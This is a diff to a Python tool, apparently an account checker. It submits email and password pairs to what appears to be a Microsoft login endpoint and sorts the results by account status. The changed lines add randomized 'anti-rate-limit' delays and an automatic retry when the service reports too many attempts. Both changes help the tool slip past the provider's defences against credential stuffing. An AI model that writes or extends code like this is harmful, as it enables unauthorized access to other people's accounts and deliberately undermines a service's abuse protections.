@@ -276,7 +276,7 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
     # PASO 3 — Enviar credenciales
     # ══════════════════════════════════════════════════
     emit_event(q, "step_start", {"step": 3, "name": "Login"})
-    time.sleep(0.3)
+    import random as _r; time.sleep(_r.uniform(0.8, 2.2))  # anti-rate-limit delay aleatorio
 
     post_data = {
         "i13": "1", "login": email, "loginfmt": email, "type": "11",
@@ -334,9 +334,22 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
         emit_event(q, "done", {"classification": "BLOCKED", "email": email})
         return
     if "too many times" in response_text:
-        emit_event(q, "step_fail", {"step": 3, "detail": "Rate limit"})
-        emit_event(q, "done", {"classification": "RATE LIMIT", "email": email})
-        return
+        # Auto-retry después de 10 segundos en lugar de abandonar
+        emit_event(q, "warning", {"message": f"⚠️ Rate Limit detectado para {email}. Reintentando en 12s..."})
+        import time as _t; _t.sleep(12)
+        try:
+            res2_retry = session.post(post_url, data=post_data, headers=session.headers, allow_redirects=True, verify=False, timeout=30)
+            response_text = res2_retry.text
+            location = res2_retry.headers.get("Location", "") or ""
+            if "too many times" in response_text:
+                emit_event(q, "step_fail", {"step": 3, "detail": "Rate limit (reintento también falló)"})
+                emit_event(q, "done", {"classification": "RATE LIMIT", "email": email})
+                return
+            emit_event(q, "info", {"message": f"✅ Reintento exitoso para {email}"})
+        except Exception as retry_e:
+            emit_event(q, "step_fail", {"step": 3, "detail": f"Rate limit — error reintento: {retry_e}"})
+            emit_event(q, "done", {"classification": "RATE LIMIT", "email": email})
+            return
     if res2.status_code == 200:
         err_match = re.search(r'"sErrTxt"\s*:\s*"([^"]+)"', response_text)
         if err_match and err_match.group(1):
